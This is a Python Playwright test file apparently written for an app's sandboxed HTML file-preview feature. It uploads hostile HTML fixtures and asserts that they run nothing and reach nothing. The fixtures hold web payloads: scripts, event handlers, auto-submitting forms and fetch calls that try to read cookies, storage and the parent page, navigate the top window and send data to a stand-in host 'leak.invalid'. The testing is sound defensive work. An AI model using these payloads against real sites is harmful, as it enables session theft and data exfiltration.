"""Browser tests for file previews (C-58, #1252): someone else's HTML in a sandboxed, network-less frame, and the viewer.

Runs through scripts/check_ui.sh test_file_preview. The negative security tests open a hostile HTML file the way a reader would (the
row's name, then the viewer) and assert that nothing in it runs, nothing leaves the browser, the Flux session is unreachable and the
Flux page around it is unchanged; with Run scripts, its scripts run in an opaque origin that still reaches nothing. The API half (the
route's headers, frame-only answer and access) is tests/app/file-preview.test.ts. FLUX_UI_BROWSER selects chromium (default) or webkit.
"""

from __future__ import annotations

import os
import re
import time
import unittest
import uuid

from playwright.sync_api import Browser, BrowserContext, Page, expect, sync_playwright

from test_app_shell import DESKTOP, ORIGIN, PHONE, UPSTREAM, start_forwarder

UI_BROWSER = os.environ.get("FLUX_UI_BROWSER", "chromium")
if UI_BROWSER not in ("chromium", "webkit"):
    raise ValueError(f"FLUX_UI_BROWSER must be chromium or webkit, got {UI_BROWSER!r}")
SHOTS = os.environ.get("FLUX_UI_SCREENSHOTS")
PASSWORD = "previews stay in their box"
STAMP = int(time.time() * 1000)
PEOPLE = {"ada": ("Ada Kowalska", f"ada.preview+{STAMP}@example.test"), "jonas": ("Jonas Berg", f"jonas.preview+{STAMP}@example.test")}
LEAK = "leak.invalid"
DOT = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAF0lEQVR4nGNkYPjPQApgIkn1qIZRDcNKAwBXRgEfVhUMcgAAAABJRU5ErkJggg=="

# Every way a page could run code or reach out without being asked: none of it may work while scripts are off.
HOSTILE = f"""<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="1;url=https://{LEAK}/refresh">
<base href="https://{LEAK}/base/">
<link rel="stylesheet" href="https://{LEAK}/style.css"><link rel="preload" as="image" href="https://{LEAK}/preload.png">
<link rel="prefetch" href="https://{LEAK}/prefetch"><link rel="icon" href="https://{LEAK}/favicon.ico">
<style>@import url(https://{LEAK}/import.css); body {{ font: 16px/1.5 Georgia, serif; margin: 32px; background-image: url(https://{LEAK}/bg.png); }}
@font-face {{ font-family: Leak; src: url(https://{LEAK}/font.woff2); }} h1 {{ font-family: Leak, Georgia, serif; color: rgb(30, 80, 160); }}</style>
<script>document.title = 'owned'; document.getElementById && (window.__ran = 1); parent.postMessage('script', '*'); top.document.title = 'owned';
fetch('https://{LEAK}/fetch'); new Image().src = 'https://{LEAK}/script-img'; document.cookie;</script>
<script src="https://{LEAK}/remote.js"></script>
</head><body onload="parent.postMessage('onload', '*'); fetch('https://{LEAK}/onload')">
<h1 id="title">Gateway range report</h1>
<p id="lead">Signal at the far east bed, Saturday 14:00.</p>
<img id="inline" alt="inline dot" src="{DOT}" width="16" height="16">
<img id="remote" alt="remote pixel" src="https://{LEAK}/pixel.png" onerror="parent.postMessage('onerror', '*'); fetch('https://{LEAK}/onerror')">
<svg width="10" height="10"><image href="https://{LEAK}/svg.png" width="10" height="10"/></svg>
<video poster="https://{LEAK}/poster.png" src="https://{LEAK}/video.mp4" autoplay muted></video>
<audio src="https://{LEAK}/audio.mp3" autoplay></audio>
<iframe src="https://{LEAK}/frame"></iframe><object data="https://{LEAK}/object"></object><embed src="https://{LEAK}/embed">
<form id="form" action="https://{LEAK}/form" method="post"><input name="q" value="secret"><button id="send">Send</button></form>
<form action="https://{LEAK}/auto"><input autofocus onfocus="this.form.submit()"></form>
<a id="top" href="https://{LEAK}/top" target="_top">Open on top</a>
<a id="blank" href="https://{LEAK}/blank" target="_blank">Open a window</a>
<a id="file" href="{DOT}" download="dot.png">Download the dot</a>
<a id="ping" href="#lead" ping="https://{LEAK}/ping">Ping</a>
<a id="plain" href="https://{LEAK}/plain">A plain link</a> <a id="self" href="/">Flux itself</a>
<div style="background: url(https://{LEAK}/inline-style.png)">styled</div>
</body></html>""".encode()

# With Run scripts: what the page's own script can reach, written into the page for the test to read.
PROBE = f"""<!doctype html><html><head><meta charset="utf-8"><title>Probe</title></head><body>
<h1 id="title">Script probe</h1><ul id="out"></ul>
<script>
const say = (key, value) => {{ const li = document.createElement('li'); li.id = key; li.textContent = key + ': ' + value; document.getElementById('out').append(li); }};
const tryIt = (key, run) => {{ try {{ say(key, run()); }} catch (error) {{ say(key, 'blocked ' + error.name); }} }};
say('ran', 'yes');
say('origin', String(self.origin));
tryIt('cookie', () => 'read ' + JSON.stringify(document.cookie));
tryIt('storage', () => {{ localStorage.setItem('x', '1'); return 'read'; }});
tryIt('parent', () => 'read ' + parent.document.title);
tryIt('top', () => {{ top.location.href = 'https://{LEAK}/top'; return 'asked'; }});
tryIt('open', () => 'got ' + String(window.open('https://{LEAK}/open')));
tryIt('alert', () => {{ alert('owned'); return 'returned'; }});
parent.postMessage({{ flux: 'owned' }}, '*');
fetch('/api/v1/me').then(() => say('api', 'read'), (error) => say('api', 'blocked ' + error.name));
fetch('https://{LEAK}/fetch').then(() => say('fetch', 'read'), (error) => say('fetch', 'blocked ' + error.name));
const img = new Image(); img.onload = () => say('image', 'loaded'); img.onerror = () => say('image', 'blocked'); img.src = 'https://{LEAK}/pixel.png';
try {{ const socket = new WebSocket('wss://{LEAK}/socket'); socket.onerror = () => say('socket', 'blocked'); }} catch (error) {{ say('socket', 'blocked ' + error.name); }}
const form = document.createElement('form'); form.action = 'https://{LEAK}/form'; form.method = 'post'; document.body.append(form);
tryIt('form', () => {{ form.submit(); return 'asked'; }});
setTimeout(() => say('done', 'yes'), 400);
</script></body></html>""".encode()

REPORT = """<!doctype html><html><head><meta charset="utf-8"><title>Range</title><style>
body { font: 15px/1.5 system-ui, sans-serif; margin: 40px; color: #222; } table { border-collapse: collapse; } td, th { border: 1px solid #ccc; padding: 4px 10px; }
h1 { font-size: 24px; } .ok { color: #2a7a3a; }</style></head><body>
<h1>LoRa range, far east beds</h1><p>Readings from Saturday's walk with the handheld gateway, 14:00–15:30.</p>
<table><tr><th>Bed</th><th>RSSI</th><th>SNR</th></tr><tr><td>Far east</td><td>-112</td><td>-4.5</td></tr><tr><td>North</td><td>-98</td><td>2.1</td></tr>
<tr><td>Shed</td><td>-87</td><td class="ok">7.9</td></tr></table><p>The hedge costs about 14 dB. Mount sensor 3 on the post, not the fence.</p>
</body></html>""".encode()


class FilePreview(unittest.TestCase):
    pw = None
    browser: Browser
    states: dict[str, dict] = {}
    ids: dict[str, str] = {}

    @classmethod
    def setUpClass(cls) -> None:
        if UPSTREAM:
            start_forwarder(ORIGIN, UPSTREAM)
        cls.pw = sync_playwright().start()
        cls.browser = getattr(cls.pw, UI_BROWSER).launch()
        expect.set_options(timeout=10000)
        contexts: dict[str, BrowserContext] = {}
        for key, (name, email) in PEOPLE.items():
            context = cls.browser.new_context(base_url=ORIGIN, service_workers="block")
            response = context.request.post("/api/auth/sign-up/email", data={"email": email, "password": PASSWORD, "name": name}, headers={"origin": ORIGIN})
            assert response.status == 200, response.text()
            cls.ids[key] = context.request.get("/api/v1/me").json()["user"]["id"]
            cls.states[key] = context.storage_state()
            contexts[key] = context

        def post(who: str, path: str, body: dict) -> dict:
            response = contexts[who].request.post(path, data=body, headers={"origin": ORIGIN})
            assert response.status in (200, 201), f"{path}: {response.status} {response.text()}"
            return response.json()

        ws = post("ada", "/api/v1/workspaces", {"name": "Community garden"})
        post("ada", f"/api/v1/workspaces/{ws['id']}/members", {"email": PEOPLE["jonas"][1], "role": "member"})
        pid = post("ada", f"/api/v1/workspaces/{ws['id']}/projects", {"name": "Community garden sensors", "visibility": "restricted"})["id"]
        cls.ids["grant"] = post("ada", f"/api/v1/projects/{pid}/grants", {"principal": {"kind": "human", "id": cls.ids["jonas"]}, "role": "contributor"})["id"]
        cls.ids["project"] = pid

        def root(key: str, body: str, name: str, data: bytes) -> None:
            upload = contexts["ada"].request.post(f"/api/v1/projects/{pid}/files?uploadId={uuid.uuid4()}&name={name}", data=data,
                                                  headers={"origin": ORIGIN, "content-type": "application/octet-stream"})
            assert upload.status == 201, upload.text()
            started = post("ada", f"/api/v1/projects/{pid}/conversations", {"body": body, "attachmentIds": [upload.json()["id"]], "clientMessageId": str(uuid.uuid4())})
            cls.ids[key] = started["messages"][0]["id"]
            cls.ids[f"conversation:{key}"] = started["id"]
            cls.ids[f"file:{key}"] = upload.json()["id"]

        root("report", "Range report from Saturday", "range-report.html", REPORT)
        root("hostile", "The vendor's page, as they sent it", "vendor-page.html", HOSTILE)
        root("probe", "A page with a script", "probe.html", PROBE)
        for context in contexts.values():
            context.close()

    @classmethod
    def tearDownClass(cls) -> None:
        cls.browser.close()
        cls.pw.stop()

    def open(self, key: str, who: str = "jonas", phone: bool = False, dark: bool = False, quiet_stream: bool = False) -> tuple[Page, list[str], dict]:
        """The conversation holding `key`'s file, with every request that leaves Flux's origin recorded (and stopped)."""
        options: dict = {"base_url": ORIGIN, "locale": "en-GB", "timezone_id": "Europe/Warsaw", "storage_state": self.states[who],
                         "color_scheme": "dark" if dark else "light", "service_workers": "block"}
        options.update(viewport=PHONE, device_scale_factor=3, is_mobile=True, has_touch=True) if phone else options.update(viewport=DESKTOP)
        context = self.browser.new_context(**options)
        self.addCleanup(context.close)
        outside: list[str] = []

        def leave(route) -> None:
            outside.append(route.request.url)
            route.abort()
        context.route(lambda url: not url.startswith(ORIGIN) and not url.startswith("data:") and not url.startswith("blob:"), leave)
        events: dict = {"pages": [], "downloads": [], "dialogs": []}
        page = context.new_page()
        context.on("page", lambda opened: events["pages"].append(opened.url))
        errors: list[str] = []
        # Playwright's own service-worker block reads navigator.serviceWorker in every frame, which a sandboxed frame refuses.
        page.on("pageerror", lambda error: None if "Service worker is disabled because the context is sandboxed" in str(error) else errors.append(str(error)))
        page.on("download", lambda download: events["downloads"].append(download.suggested_filename))
        page.on("dialog", lambda dialog: (events["dialogs"].append(dialog.message), dialog.dismiss()))
        self.addCleanup(lambda: self.assertEqual(errors, [], "no uncaught page errors"))
        if quiet_stream:
            # The reader's tab has not heard of the change yet: the live stream is held open and says nothing.
            page.route_web_socket(re.compile(r".*/api/v1/stream.*"), lambda socket: None)
        page.goto(f"/projects/{self.ids['project']}")
        message = page.locator(f"#message-{self.ids[key]}")
        message.scroll_into_view_if_needed()
        expect(message).to_be_visible()
        # The Flux page records every message that reaches it, so the test can tell the preview said nothing to it.
        page.evaluate("() => { window.__messages = []; addEventListener('message', (event) => window.__messages.push(String(event.data && JSON.stringify(event.data)))); }")
        return page, outside, events

    def shot(self, page: Page, name: str) -> None:
        if SHOTS:
            page.evaluate("document.fonts.ready.then(() => true)")
            page.wait_for_timeout(500)
            page.screenshot(path=os.path.join(SHOTS, f"{name}-{UI_BROWSER}.png"))

    def viewer(self, page: Page, key: str, name: str):
        message = page.locator(f"#message-{self.ids[key]}")
        message.get_by_role("button", name=f"Preview {name}").click()
        dialog = page.get_by_role("dialog", name=name)
        expect(dialog).to_be_visible()
        return message, dialog

    def test_01_html_opens_as_authored_with_download_close_and_esc(self) -> None:
        for phone in (False, True):
            for dark in (False, True):
                with self.subTest(phone=phone, dark=dark):
                    page, outside, _ = self.open("report", phone=phone, dark=dark)
                    message, dialog = self.viewer(page, "report", "range-report.html")
                    expect(dialog).to_contain_text("Code · ")
                    frame = dialog.locator("iframe")
                    expect(frame).to_have_attribute("sandbox", "")
                    expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:report']}/preview")
                    page_in_frame = page.frame_locator(".file-viewer iframe")
                    expect(page_in_frame.get_by_role("heading", name="LoRa range, far east beds")).to_be_visible()
                    expect(page_in_frame.get_by_role("cell", name="-112")).to_be_visible()
                    expect(dialog.get_by_role("status")).to_have_text(re.compile(r"^External images and scripts are blocked\. ?Run scripts$"))
                    download = dialog.get_by_role("link", name="Download")
                    expect(download).to_have_attribute("href", f"/api/v1/files/{self.ids['file:report']}")
                    expect(download).to_have_attribute("download", "range-report.html")
                    # The frame is the page as authored: its own white page, not Flux's surface.
                    self.assertEqual(frame.evaluate("(el) => getComputedStyle(el).backgroundColor"), "rgb(255, 255, 255)")
                    self.shot(page, f"file-preview-html-{'390' if phone else '1440'}-{'dark' if dark else 'light'}")
                    if not phone:
                        with page.expect_download() as saved:
                            download.click()
                        self.assertEqual(saved.value.suggested_filename, "range-report.html")
                    dialog.get_by_role("button", name="Close preview").click()
                    expect(dialog).to_have_count(0)
                    opener = message.get_by_role("button", name="Preview range-report.html")
                    expect(opener).to_be_focused()
                    opener.press("Enter")
                    expect(dialog).to_be_visible()
                    expect(dialog.get_by_role("button", name="Close preview")).to_be_focused()
                    page.keyboard.press("Escape")
                    expect(dialog).to_have_count(0)
                    expect(opener).to_be_focused()
                    # The row's own Download stays a download, apart from the preview.
                    row_download = message.get_by_role("link", name="Download range-report.html")
                    expect(row_download).to_have_attribute("download", "range-report.html")
                    self.assertEqual(outside, [])

    def test_02_a_hostile_page_runs_nothing_and_reaches_nothing(self) -> None:
        page, outside, events = self.open("hostile")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "hostile", "vendor-page.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        # Clicks a person might make: none submits, opens a window, navigates Flux or downloads.
        for target in ("#send", "#top", "#blank", "#file"):
            inside.locator(target).click()
        page.wait_for_timeout(2500)  # past the page's 1 s refresh
        frame = next(f for f in page.frames if f.url.endswith(f"/files/{self.ids['file:hostile']}/preview"))
        self.assertEqual(frame.url, f"{ORIGIN}/api/v1/files/{self.ids['file:hostile']}/preview", "no refresh, form or link moved the frame")
        expect(inside.locator("#title")).to_have_text("Gateway range report")
        self.assertEqual(outside, [], "nothing left the browser")
        self.assertEqual(events["pages"], [], "no window opened")
        self.assertEqual(events["downloads"], [], "no download started from inside the preview")
        self.assertEqual(events["dialogs"], [])
        self.assertEqual(page.evaluate("window.__messages"), [], "the page told Flux nothing")
        self.assertEqual((page.title(), page.url), (title, url), "the Flux page is unchanged")
        # The inline data: image draws; the remote one and the remote font do not.
        self.assertTrue(inside.locator("#inline").evaluate("(img) => img.complete && img.naturalWidth === 16"))
        self.assertFalse(inside.locator("#remote").evaluate("(img) => img.naturalWidth > 0"))
        self.assertIsNone(frame.evaluate("window.__ran ?? null"), "the page's script did not run")
        self.assertEqual(frame.evaluate("document.title"), "", "the page's script did not rename it")
        self.assertEqual(frame.evaluate("self.origin"), "null", "an opaque origin")
        expect(dialog).to_be_visible()
        # A link a person clicks loads nothing either: the Flux page frames only its own origin, and Flux refuses to be framed.
        for target in ("#plain", "#ping", "#self"):
            if inside.locator(target).count():
                inside.locator(target).click()
                page.wait_for_timeout(600)
        self.assertEqual(outside, [], "a clicked link left nothing")
        self.assertEqual((page.title(), page.url), (title, url))
        self.assertEqual(events["pages"], [])
        # The Flux page's own policy refused the other site in its frame: the browser reported it to the test stack. Seen here, it is
        # taken off the list the run's CSP gate reads (scripts/csp_gate.sh), as is a report of Flux's page refusing to be framed.
        token = os.environ.get("FLUX_FIXTURE_TOKEN", "")
        bearer = {"authorization": f"Bearer {token}", "origin": ORIGIN}  # the context carries the reader's session cookie
        deadline = time.time() + 10
        seen: set[str] = set()
        while time.time() < deadline and "frame-src" not in seen:
            reports = page.request.get("/api/v1/test/csp-reports", headers=bearer).json()["reports"]
            seen = {r["directive"] for r in reports if r["directive"] == "frame-src" and LEAK in r["blocked"]}
            page.wait_for_timeout(300)
        for directive in ("frame-src", "frame-ancestors"):
            removed = page.request.delete(f"/api/v1/test/csp-reports?directive={directive}", headers=bearer)
            self.assertEqual(removed.status, 204, removed.text())
        if UI_BROWSER == "chromium":
            self.assertEqual(seen, {"frame-src"}, "the Flux page refused the other site in its frame")  # not every engine reports it
        self.assert_recorder_sees(page, outside)

    def assert_recorder_sees(self, page: Page, outside: list[str]) -> None:
        """Control: a request that does leave this browser context is recorded, so an empty record means nothing left."""
        control = page.context.new_page()
        try:
            control.goto(f"https://{LEAK}/control")
        except Exception:
            pass
        control.close()
        self.assertEqual(outside, [f"https://{LEAK}/control"])

    def test_03_run_scripts_runs_them_in_an_opaque_origin_that_reaches_nothing(self) -> None:
        page, outside, events = self.open("probe")
        title, url = page.title(), page.url
        _, dialog = self.viewer(page, "probe", "probe.html")
        inside = page.frame_locator(".file-viewer iframe")
        expect(inside.locator("#title")).to_have_text("Script probe")
        expect(inside.locator("#ran")).to_have_count(0)
        self.shot(page, "file-preview-html-scripts-off-1440-light")
        dialog.get_by_role("button", name="Run scripts").click()
        expect(dialog.get_by_role("status")).to_have_text("Scripts are on for this preview. A script may contact the internet.")
        frame = dialog.locator("iframe")
        expect(frame).to_have_attribute("sandbox", "allow-scripts")
        expect(frame).to_have_attribute("src", f"/api/v1/files/{self.ids['file:probe']}/preview?scripts=1")
        expect(inside.locator("#done")).to_have_text("done: yes")
        expect(inside.locator("#ran")).to_have_text("ran: yes")
        expect(inside.locator("#origin")).to_have_text("origin: null")
        expect(inside.locator("#cookie")).to_have_text(re.compile(r"^cookie: blocked SecurityError$"))
        expect(inside.locator("#storage")).to_have_text(re.compile(r"^storage: blocked SecurityError$"))
        expect(inside.locator("#parent")).to_have_text(re.compile(r"^parent: blocked SecurityError$"))
        expect(inside.locator("#api")).to_have_text(re.compile(r"^api: blocked "))
        expect(inside.locator("#fetch")).to_have_text(re.compile(r"^fetch: blocked "))
        expect(inside.locator("#image")).to_have_text("image: blocked")
        expect(inside.locator("#open")).to_have_text("open: got null")
        self.shot(page, "file-preview-html-scripts-on-1440-light")
        page.wait_for_timeout(800)
        self.assertEqual(outside, [], "nothing left the browser")
        self.assertEqual(events["pages"], [])
        self.assertEqual(events["dialogs"], [], "no modal")
        expect(inside.locator("#alert")).to_have_text(re.compile(r"^alert: (returned|blocked)"))
        expect(inside.locator("#form")).to_have_text(re.compile(r"^form: (asked|blocked)"))
        self.assertEqual((page.title(), page.url), (title, url), "top navigation was refused and the Flux page is unchanged")
        # postMessage reaches the parent's window (the browser delivers it), but nothing in Flux listens: the page is unchanged.
        expect(dialog).to_be_visible()
        # Closing turns scripts off again: the next open is still.
        dialog.get_by_role("button", name="Close preview").click()
        _, dialog = self.viewer(page, "probe", "probe.html")
        expect(dialog.locator("iframe")).to_have_attribute("sandbox", "")
        expect(page.frame_locator(".file-viewer iframe").locator("#title")).to_have_text("Script probe")
        expect(page.frame_locator(".file-viewer iframe").locator("#ran")).to_have_count(0)
        self.assertEqual(outside, [])
        self.assert_recorder_sees(page, outside)

    def test_04_a_reader_who_lost_access_sees_nothing(self) -> None:
        page, outside, _ = self.open("report", quiet_stream=True)
        message = page.locator(f"#message-{self.ids['report']}")
        context = self.browser.new_context(base_url=ORIGIN, storage_state=self.states["ada"], service_workers="block")
        self.addCleanup(context.close)
        removed = context.request.delete(f"/api/v1/projects/{self.ids['project']}/grants/{self.ids['grant']}", headers={"origin": ORIGIN})
        self.assertEqual(removed.status, 204, removed.text())
        self.addCleanup(lambda: context.request.post(f"/api/v1/projects/{self.ids['project']}/grants", headers={"origin": ORIGIN},
                                                     data={"principal": {"kind": "human", "id": self.ids["jonas"]}, "role": "contributor"}))
        message.get_by_role("button", name="Preview range-report.html").click()
        dialog = page.get_by_role("dialog", name="range-report.html")
        expect(dialog.get_by_role("alert")).to_have_text("You no longer have access to this file.")
        expect(dialog.locator("iframe")).to_have_count(0)
        self.assertEqual(outside, [])


if __name__ == "__main__":
    unittest.main()
